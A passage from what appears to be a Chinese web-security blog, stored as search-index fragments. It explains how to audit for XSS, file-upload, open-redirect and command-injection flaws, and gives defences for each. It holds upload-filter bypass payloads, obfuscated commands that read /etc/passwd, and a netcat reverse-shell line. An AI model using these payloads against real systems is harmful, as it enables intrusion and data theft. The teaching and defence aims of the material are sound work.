输入在Java中常用request.getParameter(param)或${param}获取用户的输入信息； 输出主要表现为前端的渲染，我们可以定位前端中的一些常见的标识符来找到他们，然后根据后端逻辑来判断漏洞是否存在。 1.JSP表达式 \u003c%=变量%\u003e是\u003c%out.println(变量);%\u003e的简写方式，\u003c%=%\u003e用于将已声明的变量或表达式输出到外网页中 2.EL（表达式语言） 是为了使jsp写起来更加简单。 例如：\u003c%=request.getParameter(\"username\")%\u003e等价于${param.username} \u003cc:out\u003e 标签 \u003cc:if\u003e 标签 \u003cc:forEach\u003e 标签 3.ModelAndView类的使用 ModelAndView用来存储处理完成后的结果数据，以及显示该数据的视图，其前端JSP页面可以使用${参数}的方法来获取值 4.ModelMap类的使用 可以根据模型属性的具体类型自动生成模型属性的名称 5.Model类的使用 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:4:1","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"对于反射型XSS 白盒审计中，需要寻找带有参数的输出方法，然后对输出方法对输出内容回溯输入参数 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:4:2","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"对于存储型XSS 要统一寻找“输出点”和“输出点”。由于输出点与输入点可能不在一个业务流中，可以考虑以下方法提高效率： 1.黑白盒结合 2.通过功能、接口名、表名、字段名等角度做搜索 寻找输入点 审计输入点代码 对输出点进行审计 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:4:3","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"对于Dom型XSS dom型xss不需要与服务器交互，它只发生在客户端处理数据阶段。 粗略说，Dom型xss的成因是不可控的危险数据，未经过滤传入存在缺陷的js代码处理。 Dom型XSS常见的输入输出点： 输入点 输出点 document.URL eval document.location document.write document.referer document.InnerHTML document.form document.OuterHTML ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:4:4","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"关键字 \u003c%= ${ \u003cc:out \u003cc:if \u003cc:forEach ModelAndView ModelMap Model request.getParameter request.setAttibute request.getWriter().print() request.getWriter().writer() ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:4:5","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞防御 对与后端有交互的位置执行参数的输入过滤（课通过Java的filter、Spring参数校验注解来实现。比如编写全局过滤器实现拦截并在web.xml中进行配置） 对与后端有交互的位置执行参数的输出转义/html编码等 开启JS开发框架的XSS防护功能 设置HttpOnly（严格的说，HttpOnly对防御XSS不起作用，主要是为了解决xss漏洞后续的cookie劫持攻击，可以阻止客户端脚本访问cookie） 采用OWASP企业安全程序接口(ESAPI)实现，类似内容还有谷歌的xssProtect等 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:5:0","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"参考 https://www.cnblogs.com/xyz315/p/14850359.html https://cloud.tencent.com/developer/article/1474865 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-wrappers-javascript-and-data-uri 未完待续… ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:6:0","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"简介 上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。 危害：能够直接获取到Web权限，后续操作还不好说么 ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"上传技巧\u0026绕过 ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"upload-lab 结合upload-labs关卡的文章 我前面也写了个通关的文章； 另一篇wp：https://github.com/LandGrey/upload-labs-writeup ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:1","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"编辑器类上传漏洞 百度Ueditor controller.ashx?action=catchimage fckeditor 查看版本 /fckeditor/editor/dialog/fck_about.html /FCKeditor/_whatsnew.html Kindeditor 上传页面 kindeditorlasp/upload_json.asp kindeditorlasp.net/upload_json.ashx kindeditorljsp/upload_json.jsp kindeditor/php/upload_json.php ewebeditor … … ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:2","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"中间件解析漏洞 IIS6.0 -\u003e windows server03 文件名：logo.jpg ===\u003e有漏洞： logo.asp;.jpg 文件夹：image/logo.jpg =\u003e有漏洞： image.asp/qq.jpg 几乎100%存在漏洞（官方未有补丁） IIS7.X -\u003e win7、win server2008 www.a.com/logo.png www.a.com/logo.png/.php 将前面的logo.php进行php格式解析 验证： 访问网站上一个图片，后面加上.php/ , 如果出现乱码，则存在 apache 低版本 逐级解析 www.a.com/index.php www.a.com/index.php.xxx.qqq 向上(前面)解析，如果不识别就向上，直到识别为止(未知拓展名解析漏洞) AddHandler导致的的解解析析漏洞 如果运维人员给.php后缀增加了处理器： AddHandler application/x-httpd-php .php`那么，在有多个后缀的情况下，只要一个文件名中含有.php后缀，即被识别成PHP文件，没必要是最后一个后缀。 利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 Apache HTTPD 换行解析漏洞(CVE-2017-1571) 2.4.0~2.4.29版本 此漏洞形成的根本原因，在于正则表达式中不仅匹配字符串结尾位置，也可以匹配\\n 或 \\r 在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 \u003cFilesMatch .php$\u003e SetHandler application/x-httpd-php Nginx 低版本 和IIS7.X 版本一样 配置文件错误导致的解析漏洞 对于任意文件名，在后面添加/xxx.php（xxx为任意字符）后,即可将文件作为php解析。 例：info.jpg后面加上/xxx.php，会将info.jpg 以php解析。 **ps: ** 该漏洞是Nginx配置所导致，与Nginx版本无关 ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:3","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Bypass ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"命名下的变异 1.可解析的脚本后缀，也就是该语言有多个可解析的后缀 2.大小写混合，如果系统过滤不严，可能大小写可以绕过 3.中间件安全，部分中间件存在文件解析漏洞 服务器特性: 1.会将Request中的不能编码部分的%去掉 2.Request中如果有unicode部分会将其进行解码 # IIS lIS6.0两个解析缺陷:目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析，例如: /abc.asp/1.jpg会当做/abc.asp进行解析。 /abc.php;1.jpg会当做/abc.php进行解析。 IIS/7.5（两次%00截断： xxx.asp%00.asp%00.jpg + 二次上传 ？） # Apache1.x 2.X解析漏洞 Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Anache可识别的扩展名为止。 # Nginx 以下Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jiog，然后以shell.jpg.php进行请求 Nginx 0.5.* Nginx 0.6.* Nginx 0.7\u003c= 0.7.65 Nginx 0.8\u003c= 0.8.37 以下Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以 ·shell.jpg%20.php·进行请求。 # Nginx 0.8.41 - 1.5.6: # PHP CGI解析漏洞 IS7.0/7.5和Nginx\u003c0.8.3 以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析。 4.系统特性 test.asp. test.asp (空格) test.php:1.jpg test.php::$DATA test.php_ 5.语言漏洞，流行的三种脚本语言基本都存在00截断漏洞。 JSP文件名绕过: 6.双后缀，与系统和中间件无关，偶尔存在于代码逻辑之中 可解析的后缀+大小写混合 可解析的后缀+大小写混合+中间件漏洞 .htaccess + 大小写混合 可解析的后缀+大小写混合+系统特性 可解析的后缀+大小写混合+语言漏洞 可解析的后缀+大小写混合+双后缀 上面的可以绕过脚本本身的限制的，但是不能过waf ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:1","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"文件名绕过 1.文件名加回车 2.shell.php(%30-%99).jpg绕过 3.如果有改名功能，可先上传正常文件，再改名. 4.%00 5.00(hex) 6.长文件名(windows 258byte / linux 4096bydte)，可使用非字母数字，比如中文等最大程度的拉长。 7.重命名 ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:2","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"协议解析不一致,绕过waf(注入跨站也可尝试) 1.垃圾数据 ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:3","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"未解析所有文件 multipart协议中，一个POST请求可以同时上传多个文件。许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过。 ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:4","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"参数下的变异 Content-Disposition 一般可以进行任意修改甚至删除 Content-Type 视情况而定, 需要考虑网站上传验证是否进行处理 filename 可以修改 一些payload: # 文件名覆盖 filename=\"1.txt\";filename=\"php.php\" # 遗漏文件名（当WAF遇到name=\"myfile\";;时，认为没有解析到filename。而后端容器继续解析到的文件名是t3.jsp，导致WAF被绕过） name=\"myfile\";;filename=\"php.php\" filename=\"x.php%00.jpg\" filename=php.php; #去掉双引号和添加一个分号，匹配的是`php.php;`和分号 filename=\"x.php filename=\"'x.php #后面的单引号没闭合 filename=\"'x.php\" filename= ;filename=\"php.php\" #多写几个变量，buwng不往后匹配第一个留空，没有值就 # 文件名回车 filename=\"x. p h p \" #用多个换行(%0a 的url decode)来避开 不规则Content-Disposition文件名覆盖: 多个content-Disnosition文件名覆盖(Win2k8 +IIS7.0+ PHP): 更换filename位置(iis 6): 删除content-type字段 删除content-disposition空格: 修改 Content-Disposition字段值的大小写: boundarv空格(Win2k3 +lIS6.0+ ASP): boundary边界不一致(Win2k3 + IS6.0+ ASP): php+apache畸形的boundary: php在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的 boundarv为–aaaa,123456 , php解析的时候只识别了–aaaa ,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS ===绕过： 去除\"““绕过： 少“绕过： 文件名.php+回车：这样引号就在另一行。同时上传内容的一句话前面加个中文字符 Content-Disposition: Content-type: ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:5","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Fuzz结合 Bypass ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:6","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Java代码审计 ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"文件上传方式 Java中文件上传方式很多，常用的有三种： 1.通过文件流的方式上传 2.通过ServletFileUpload方式上传 3.通过MultipartFile方式上传 ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:1","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"关键字 org.apache.commons.fileupload java.io.File MultipartFile RequestMethod MultipartHttpServletRequest CommonsMutipartresover File lastIndexOf indexOf FileUpload getRealPath getServletPath getPathInfo getContentType equalsIgnoreCase FiltUtils MultipartRequestEntity UploadHandleServlet FileLoadServlet FileOutpuStream getInputStream DiskFileIntemFactory ... ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:2","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞防御 文件后缀名截取校验时候，忽略大小写 严格检测文件类型，推荐白名单 Java小于jdk7u40时可能存在截断漏洞，注意版本影响 限制文件上传的大小和频率 对上传的文件重命名、自定义后缀等 ","date":"2022-01-17","objectID":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:5:0","tags":["文件上传","代码审计"],"title":"文件上传漏洞","uri":"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞简介 **URL跳转：**目前很多Web应用因为业务需要，需要与内部的其他服务或者第三方的服务进行交互，这样就需要重定向的功能，由当前网页跳转到第三方网页。 比如Java中可通过Header的重定向功能实现url的跳转 response.sendRedirect(request.getParameter(\"url\")); 使用的时候就是： http://www.test.com?url=http://www.xxx.com **URL跳转漏洞：**也叫URL重定向漏洞。由于服务端未对传入的跳转url变量进行检查和控制，可导致恶意用户构造一个恶意地址，诱导用户跳转到恶意网站。因为是从用户可信站点跳转出去的，用户会比较信任该站点，所以其常用于用于钓鱼攻击，通过跳转到恶意网站欺骗用户输入用户名和密码来盗取用户信息，或欺骗用户进行金钱交易；还可以造成xss漏洞。 例子： \u003c?php $url=$_GET['url']; header(\"Location: $url\"); ?\u003e 恶意用户可以提交:http://www.aaa.com/login.php?...://www.bbb.com(钓鱼网站) 来生成自己的恶意链接，安全意识较低的用户很可能会以为该链接展现的内容是www.aaa.com从而可能产生欺诈行为 ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:1:0","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"产生位置 用户登录(最常见)、统一身份认证处，认证完后会跳转(在登陆的时候建议多观察url参数) 用户分享、收藏内容过后，会跳转 跨站点认证、授权后，会跳转 站内点击其它网址链接时，会跳转 在一些用户交互页面也会出现跳转，如请填写对客服评价，评价成功跳转主页，填写问卷，等等业务，注意观察url 业务完成后跳转这可以归结为一类跳转，比如修改密码，修改完成后跳转登陆页面，绑定银行卡，绑定成功后返回银行卡充值等页面，或者说给定一个链接办理VIP，但是你需要认证身份才能访问这个业务，这个时候通常会给定一个链接，认证之后跳转到刚刚要办理VIP的页面。 ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:2:0","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"实现方式 1.META标签内跳转 2.javascript跳转 3.header跳转 ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:3:0","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞检测 ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:4:0","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"检测方法 修改参数中合法的URL为非法URL，然后查看是否能正常跳转或者响应是否包含了任意的构造URL。 ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:4:1","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常见产生漏洞的参数名 在黑盒测试时，需多留意关注常见的可能产生漏洞的参数名，可以用来fuzz： # 注意URL中是否含有以下参数值 callback redirect redirect_to redirect_url redirectUrl toUrl url return ReturnUrl fromUrl goto to jump jump_to target redUrl link linkto domain oauth_callback ... # 并注意观察后跟的URL地址的具体格式，再构造相应的payload尝试跳转 ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:4:2","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"URL跳转Bypass 1.最常用的：@绕过 url=http://www.aaaa.com@www.xxx.com(要跳转的页面)他有的可能验证只要存在aaaa.com就允许访问，做个@解析，实际上我们是跳转到xxx.com的 2.绕过一些匹配特定字符 2.1 ?问号绕过 url=http://www.aaaa.com?www.xxx.com 2.2 #绕过 url=http://www.aaaa.com#www.xxx.com 3.斜杠/绕过 url=http://www.aaaa.com/www.xxx.com 反斜线\\绕过 url=http://www.aaaa.com\\www.xxx.com 4.白名单匹配绕过 #比如匹配规则是必须跳转，aaa.com 域名下，?#等都不行的时候，aaa.com，可以尝试百度inurl:aaa.com的域名，比如xxxaaa.com，这样同样可以绕过。 5.xip.io绕过 # 在绕过ssrf限制中使用过 # 当你访问aaa.com这个域名时，其实这个链接已经被解析到后面这个ip地址上了，那么实际访问的就是后面这个IP地址 url=http://www.aaa.com.220.181.57.217.xip.io 6.白名单网站可信 如果url跳转点信任百度url，google url或者其他，则可以多次跳转达到自己的恶意界面。 7.协议绕过 #http与https协议转换尝试，或者省略 redict=//www.aaa.com@www.baidu.com redict=////www.aaa.com@www.baidu.com # //多斜线 8.xss跳转 # 就是XSS造成的跳转，在有些情况下XSS只能造成跳转的危害。 \u003cmeta content=\"1;url=http://www.baidu.com\" http-equiv=\"refresh\"\u003e ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:5:0","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"代码审计 在白盒审计中，我们则会重点关注可以进行URL跳转的相关方法。 ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:6:0","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Spring MVC中使用重定向常用的方法 1.使用ModelAndView方式 2.通过返回String方式 3.使用sendRedirect方式 4.通过设置Header来进行跳转 ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:6:1","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常用关键字 根据以上常用方法，可以提取如下关键字： redirect sendRedirect ModelAndView Location addAttribute getHost setHeader forward ... 其他关键字补充： 相关的参数名： # 注意URL中是否含有以下参数值 callback redirect redirect_to redirect_url redirectUrl toUrl url return ReturnUrl fromUrl goto to jump jump_to target redUrl link links linkto domain oauth_callback 在审计中，我们就可以先搜索url跳转中常见的关键字，定位到可能存在问题的代码区域，并查看前后逻辑及参数是否可控… ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:6:2","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞修复 最有效的是，严格控制要跳转的域名。若已知需要跳转URL，则可以直接在代码中写成固定值 也可以使其只根据路径跳转，而不是根据其URL参数跳转 若url事先无法确定，只能通过前端参数传入，则必须在跳转的时候对url进行按规则校验：即控制url是否是你们公司授权的白名单或者是符合你们公司规则的url XSS漏洞的注意事项 ：跳转url检测中也加入了CRLF头部注入漏洞的检测逻辑, 具体就是在请求参数中加入了%0d%0a这种测试代码，需要对这些参数进行删除处理(事实上：在判断到一个参数中包含%00 -\u003e %1f的控制字符时都是不合法的，需对其进行删除)。 设置二次提醒，提醒用户 ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:7:0","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"参考 https://www.cnblogs.com/linuxsec/articles/10926152.html ","date":"2022-01-17","objectID":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/:8:0","tags":["URL跳转","渗透测试","Web安全"],"title":"URL跳转漏洞","uri":"/url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"原理 指应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，Java中可以执行系统命令的函数有Runtime.getRuntime.exec()，PrpcessBuilder.start()(第一个是jdk1.5前。第二个是jdk1.5后)。当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。 ","date":"2022-01-17","objectID":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["命令执行漏洞","代码审计"],"title":"命令执行漏洞","uri":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"利用条件 应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严 ","date":"2022-01-17","objectID":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["命令执行漏洞","代码审计"],"title":"命令执行漏洞","uri":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"危害 继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至服务器 进一步内网渗透 等等（都能执行系统命令了，危害肯定超级大了） ","date":"2022-01-17","objectID":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["命令执行漏洞","代码审计"],"title":"命令执行漏洞","uri":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常见连接符 符号 含义 | 前面命令输出结果作为后面命令的输入内容 || 前面命令执行失败时才执行后面的命令（具有短路效果，左边是true，右边不执行） \u0026 前面命令执行后继续执行后面的命令（无论左边是false还是true，右边都执行） \u0026\u0026 前面命令执行成功时才执行后面的命令（具有短路效果，左边是false，右边不执行） ","date":"2022-01-17","objectID":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["命令执行漏洞","代码审计"],"title":"命令执行漏洞","uri":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"函数 ","date":"2022-01-17","objectID":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":["命令执行漏洞","代码审计"],"title":"命令执行漏洞","uri":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"php中 在php下，允许命令执行的函数有： eval（） assert（） preg_replace（） call_user_func（） 如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞 其他函数 ob_start（）、unserialize（）、creat_function（） 、usort（）、uasort（）、uksort（）、 array_filter（）、 array_reduce（）、 array_map（）...... system（） exec（） shell_exec（） passthru（） pcntl_exec（） popen（） proc_open（） 反引号 ...... ","date":"2022-01-17","objectID":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:1","tags":["命令执行漏洞","代码审计"],"title":"命令执行漏洞","uri":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"waf绕过 1.通配符 ls-l #使用通配符 /?in/?s-l /???/??t /??c/p???w? #有时候WAF不允许使用太多的？号 /?in/cat/?tc/p?sswd 2.连接符 # 在bash的操作环境中，连接符，如' echo test # 使用连接符 echo te'st \u003e' test # 注意闭合！ # 如读取/etc/passwd /'b'i'n'/'c'a't'/'e't'c'/'p'a's's'w'd # 其他字符 双引号 \" 反斜杠 \\ 3.未初始化的bash变量 在bash环境中允许我们使用未初始化的bash变量，如 $a ,$b,$c 未初始化的变量值都是null # 读取/etc/passwd: cat$a /etc$a/passwd$a #测试WAF #测试代码： \u003c?php echo \"OK\"; system('dig'.$_GET['host']); ?\u003e www.baidu.com;$s/bin$s/which$s nc$s # 反弹shell: /bin$s/nc$s -e/bin$s/bash$s 2130706433 3737 ","date":"2022-01-17","objectID":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:6:0","tags":["命令执行漏洞","代码审计"],"title":"命令执行漏洞","uri":"/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Java代码审计 